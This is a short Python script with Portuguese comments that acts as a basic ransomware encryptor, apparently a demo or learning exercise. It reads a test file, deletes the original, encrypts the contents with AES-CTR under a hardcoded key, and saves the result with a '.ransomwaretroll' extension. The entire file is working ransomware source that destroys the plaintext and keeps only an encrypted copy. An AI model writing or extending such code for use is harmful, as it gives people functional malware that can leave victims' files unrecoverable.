import os
import pyaes

# Nome do arquivo a ser criptografado
file_name = "teste.txt"

# Ler o arquivo a ser criptografado
with open(file_name, "rb") as file:
    file_data = file.read()

# Remover o arquivo original
os.remove(file_name)

# Chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
with open(file_name + ".ransomwaretroll", "wb") as new_file:
    new_file.write(crypto_data)
